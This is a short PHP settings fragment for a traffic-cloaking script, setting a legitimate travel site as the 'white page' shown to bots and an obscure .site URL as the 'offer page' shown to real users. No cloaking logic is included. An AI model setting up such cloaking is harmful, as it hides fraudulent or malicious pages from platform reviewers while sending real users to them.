<?php
/* Required settings     */
$CLOAKING['WHITE_PAGE'] = 'https://www.momondo.ru/';//PHP/HTML file or URL used for bots
$CLOAKING['OFFER_PAGE'] = 'https://ucjdeknebfbnew.site/';//PHP/HTML file or URL offer used for real users
